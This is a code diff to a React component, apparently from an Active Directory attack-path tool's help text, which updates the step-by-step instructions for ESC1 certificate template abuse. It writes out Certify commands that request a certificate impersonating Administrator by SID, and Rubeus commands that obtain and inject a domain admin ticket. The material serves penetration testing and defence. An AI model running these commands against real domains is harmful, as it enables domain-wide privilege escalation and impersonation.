@@ -587,50 +587,43 @@ const WindowsAbuse: FC = () => {
     const step6 = (
         <>
             <Typography variant='body2'>
-                <b>Step 6</b>: Use Certify to request enrollment in the affected template, specifying the affected
+                <b>Step 6</b>: Use Certify (2.0) to request enrollment in the affected template, specifying the affected
                 certification authority and target principal to impersonate:
             </Typography>
             <CodeController>
                 {
-                    'Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:"ESC1" /altname:forestrootda /sidextension:S-1-5-21-2697957641-2271029196-387917394-500'
+                    'Certify.exe request --ca rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA --template TemplateName --upn Administrator --sid S-1-5-21-976219687-1556195986-4104514715-500'
                 }
             </CodeController>
-            <Typography variant='body2'>Save the certificate as cert.pem and the private key as cert.key.</Typography>
+            <Typography variant='body2'>
+                The certificate PFX is printed to the console in a base64-encoded format.
+            </Typography>
         </>
     );
 
     const step7 = (
         <>
             <Typography variant='body2'>
-                <b>Step 7</b>: Convert the emitted certificate to PFX format:
+                <b>Step 7</b>: Optionally purge all kerberos tickets from memory:
             </Typography>
-            <CodeController hideWrap>{'certutil.exe -MergePFX .\\cert.pem .\\cert.pfx'}</CodeController>
+            <CodeController hideWrap>{'klist purge'}</CodeController>
         </>
     );
-
     const step8 = (
         <>
             <Typography variant='body2'>
-                <b>Step 8</b>: Optionally purge all kerberos tickets from memory:
+                <b>Step 8</b>: Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the
+                target identity to impersonate and the PFX-formatted certificate obtained in Step 6:
             </Typography>
-            <CodeController hideWrap>{'klist purge'}</CodeController>
+            <CodeController>
+                {'Rubeus asktgt /user:forestrootda /domain:forestroot.com /certificate:<cert base64> /ptt'}
+            </CodeController>
         </>
     );
     const step9 = (
         <>
             <Typography variant='body2'>
-                <b>Step 9</b>: Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the
-                target identity to impersonate and the PFX-formatted certificate created in Step 7:
-            </Typography>
-            <CodeController>
-                {'Rubeus asktgt /user:forestrootda /domain:forestroot.com /certificate:cert.pfx /password:asdf /ptt'}
-            </CodeController>
-        </>
-    );
-    const step10 = (
-        <>
-            <Typography variant='body2'>
-                <b>Step 10</b>: Optionally verify the TGT by listing it with the klist command:
+                <b>Step 9</b>: Optionally verify the TGT by listing it with the klist command:
             </Typography>
             <CodeController hideWrap>{'klist'}</CodeController>
         </>
@@ -650,7 +643,6 @@ const WindowsAbuse: FC = () => {
             {step7}
             {step8}
             {step9}
-            {step10}
         </>
     );
 };
